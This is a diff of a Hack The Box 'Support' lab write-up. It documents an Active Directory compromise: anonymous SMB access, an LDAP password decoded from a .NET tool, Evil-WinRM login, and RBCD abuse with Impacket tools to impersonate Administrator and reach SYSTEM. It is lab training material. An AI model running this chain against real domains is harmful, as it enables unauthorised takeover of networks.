@@ -21,17 +21,34 @@ After the foothold, BloodHound showed that `support` belonged to a group with `G
 I started enumeration by checking the services exposed by the domain controller. SMB (`445`), LDAP (`389`), Kerberos (`88`), and WinRM (`5985`) were all available, which made Active Directory enumeration the most plausible exploitation path.
 
 ```bash
-nmap -Pn -sT -p 53,88,135,139,389,445,636,5985 10.129.133.80
+┌──[brandonc@parrot]─[~]
+└─❯ nmap -Pn -sT -p 53,88,135,139,389,445,636,5985 10.129.133.80
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-15 12:21 EDT
+Nmap scan report for support.htb (10.129.133.80)
+Host is up (0.036s latency).
+
+PORT     STATE SERVICE
+53/tcp   open  domain
+**88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+**445/tcp  open  microsoft-ds
+636/tcp  open  ldapssl
+**5985/tcp open  wsman
+
+Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds
+
 ```
 
 The `support-tools` SMB share allowed anonymous access. I connected passwordless and found `UserInfo.exe.zip` among the available files.
 
 ```bash
-smbclient //10.129.133.80/support-tools -N
+┌──[brandonc@parrot]─[~]
+└─❯ smbclient //10.129.133.80/support-tools -N
 
-# Inside smbclient:
-ls
-get UserInfo.exe.zip
+smb: \> ls
+smb: \> get UserInfo.exe.zip
 ```
 
 After extracting the ZIP, I took a closer look at the executable. It was a .NET application that used an LDAP account to query the domain. Interestingly, its password wasn't stored as plain text, but the program contained everything needed to recover it.
@@ -41,11 +58,13 @@ After extracting the ZIP, I took a closer look at the executable. It was a .NET 
 Inspecting the .NET code, I followed how the application handled its stored password. The value was Base64-encoded, then decoded with a repeating XOR key and an additional XOR operation using `0xDF` (223).
 
 ```bash
-monodis UserInfo.exe > userinfo.il
-grep -niE 'password|armando|ldstr' userinfo.il
+┌──[brandonc@parrot]─[~]
+└─❯ monodis UserInfo.exe > userinfo.il
+┌──[brandonc@parrot]─[~]
+└─❯ grep -niE 'password|armando|ldstr' userinfo.il
 ```
 
-To make sure I how the password was decoded, I recreated it in Python:
+To recreate how password was decoded, I worked through each step identified in Python:
 
 ```python
 import base64
@@ -69,7 +88,8 @@ nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 This gave the password for `support\ldap`. It wasn't an administrator account, but it was enough to query AD. I searched for the `support` user and found a password stored in the account's `info` attribute.
 
 ```bash
-ldapsearch -x -H ldap://10.129.133.80 \
+┌──[brandonc@parrot]─[~]
+└─❯ ldapsearch -x -H ldap://10.129.133.80 \
   -D 'support\ldap' -W \
   -b 'DC=support,DC=htb' \
   '(sAMAccountName=support)' cn info memberOf
@@ -82,7 +102,12 @@ info: Ironside47pleasure40Watchful
 I tried those credentials with Evil-WinRM and created a reverse shell as `support`.
 
 ```bash
-evil-winrm -i 10.129.133.80 -u support -p 'Ironside47pleasure40Watchful'
+┌──[brandonc@parrot]─[~]
+└─❯ evil-winrm -i 10.129.133.80 -u support -p 'Ironside47pleasure40Watchful'
+```
+
+```powershell
+*Evil-WinRM* PS C:\Users\support\Documents> 
 ```
 
 At that point I had the user flag, but not administrative access.
@@ -109,7 +134,7 @@ I collected Active Directory relationships with BloodHound Python, imported the 
 Before creating anything, I checked the domain's `ms-DS-MachineAccountQuota` attribute. It determines how many machine accounts an ordinary domain user is allowed to create by default.
 
 ```powershell
-([ADSI]"LDAP://DC=SUPPORT,DC=HTB")."ms-DS-MachineAccountQuota"
+*Evil-WinRM* PS C:\Users\support\Documents> ([ADSI]"LDAP://DC=SUPPORT,DC=HTB")."ms-DS-MachineAccountQuota"
 ```
 
 ```text
@@ -126,7 +151,8 @@ The first `impacket-addcomputer` attempts failed with SMB login errors. NetExec 
 ```
 
 ```bash
-impacket-addcomputer \
+┌──[brandonc@parrot]─[~]
+└─❯ impacket-addcomputer \
   -method SAMR \
   -domain-netbios SUPPORT \
   -dc-host dc.support.htb \
@@ -143,7 +169,8 @@ impacket-addcomputer \
 Next I used my `GenericAll` rights to edit `DC$`'s `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. This is the setting used by **Resource-Based Constrained Delegation (RBCD)** to determine which accounts may act on behalf of other users when accessing the target service.
 
 ```bash
-impacket-rbcd \
+┌──[brandonc@parrot]─[~]
+└─❯ impacket-rbcd \
   -delegate-from 'ATTACKER$' \
   -delegate-to 'DC$' \
   -action write \
@@ -159,7 +186,8 @@ impacket-rbcd \
 I read the setting back to confirm it had actually changed:
 
 ```bash
-impacket-rbcd \
+┌──[brandonc@parrot]─[~]
+└─❯ impacket-rbcd \
   -delegate-to 'DC$' \
   -action read \
   -dc-ip 10.129.133.80 \
@@ -176,7 +204,8 @@ impacket-rbcd \
 With RBCD configured, I could use the controlled `ATTACKER$` account to request a service ticket while impersonating `Administrator`.
 
 ```bash
-impacket-getST \
+┌──[brandonc@parrot]─[~]
+└─❯ impacket-getST \
   -spn 'cifs/dc.support.htb' \
   -impersonate Administrator \
   -dc-ip 10.129.133.80 \
@@ -208,7 +237,8 @@ The ticket I obtained was **not Administrator's TGT** or password. It was an Adm
 I pointed the Kerberos-aware Impacket tools at the cache with the `KRB5CCNAME` environment variable:
 
 ```bash
-export KRB5CCNAME="$HOME/Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache"
+┌──[brandonc@parrot]─[~]
+└─❯ export KRB5CCNAME="$HOME/Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache"
 ```
 
 One related tool worth remembering is `ticketConverter.py`, which converts between Windows `.kirbi` and Linux `.ccache` ticket formats. Here I didn't need it because `impacket-getST` saved the ticket directly as `.ccache`.
@@ -218,7 +248,8 @@ One related tool worth remembering is `ticketConverter.py`, which converts betwe
 The last step was to use the CIFS ticket with Impacket's PsExec implementation. I used `-k` for Kerberos authentication and `-no-pass` to use the cached ticket without supplying a password.
 
 ```bash
-impacket-psexec -k -no-pass -dc-ip 10.129.133.80 \
+┌──[brandonc@parrot]─[~]
+└─❯ impacket-psexec -k -no-pass -dc-ip 10.129.133.80 \
   'support.htb/Administrator@dc.support.htb'
 ```
 
@@ -237,7 +268,7 @@ dc
 I had SYSTEM access on the domain controller. I retrieved the root flag with the Windows `type` command:
 
 ```cmd
-type C:\Users\Administrator\Desktop\root.txt
+C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
 ```
 
 *Root flag omitted from this public writeup.*
